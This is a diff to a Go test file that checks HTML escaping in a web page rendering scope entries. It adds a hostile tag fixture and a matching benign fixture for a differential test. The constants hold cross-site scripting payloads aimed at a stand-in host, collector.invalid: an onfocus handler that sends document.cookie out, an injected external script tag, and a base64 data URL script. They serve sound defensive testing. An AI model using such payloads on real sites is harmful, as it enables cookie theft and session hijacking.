@@ -62,6 +62,15 @@ const (
 	hostileTaskData = `data:text/html;base64,PHNjcmlwdD5mZXRjaCgnLy9jb2xsZWN0b3IuaW52YWxpZC8nKTwvc2NyaXB0Pg==`
 
 	// A scope NAME, because the heading is user text too.
+	// 🔴 A HOSTILE TAG, EVEN THOUGH THE LOADER CANNOT PRODUCE ONE. `parseTagsField` folds every
+	// tag to `[a-z0-9.-]`, so no store FILE can put this string on `Entry.Tags` — and that is
+	// exactly why it belongs here. `ui.Entry` is a projection with three writers today
+	// (`readEntry`, and two test fixtures), and a page whose escaping depended on a LOADER
+	// invariant would be one new writer away from broken with nothing to catch it. The tag also
+	// reaches an `href` through `tagHref`, which is the position `url.Values.Encode` covers and
+	// the escaper does not.
+	hostileTag = `x" onfocus="fetch('//collector.invalid/c?'+document.cookie)" data-y="`
+
 	hostileScope = `platform</h2><script src="//collector.invalid/x.js"></script><h2>`
 )
 
@@ -192,6 +201,10 @@ func benignWorld() []Scope {
 			Filename: "runbook.md",
 			Raw:      benignRaw,
 			Aliases:  []string{"rollout"},
+			// The SAME COUNT as the hostile world's, because the structural differential is a
+			// count of markup characters and a list of a different length would break it for
+			// the wrong reason.
+			Tags: []string{"marketing", "plain-tag"},
 			Tasks: refsResolvingToTheirOwnText(
 				"jira:PLAT-1",
 				"jira:PLAT-2",
@@ -224,6 +237,10 @@ func hostileWorld() []Scope {
 			Filename: hostileRef + ".md",
 			Raw:      hostileRaw,
 			Aliases:  []string{hostileAlias},
+			// TWO tags so the list renders more than one `<li>` — a one-element list cannot
+			// see a separator bug — and the second is benign so the differential has a link
+			// that is not hostile on both pages.
+			Tags: []string{hostileTag, "plain-tag"},
 			Tasks: refsResolvingToTheirOwnText(
 				hostileTaskScript,
 				hostileTaskMixedCase,
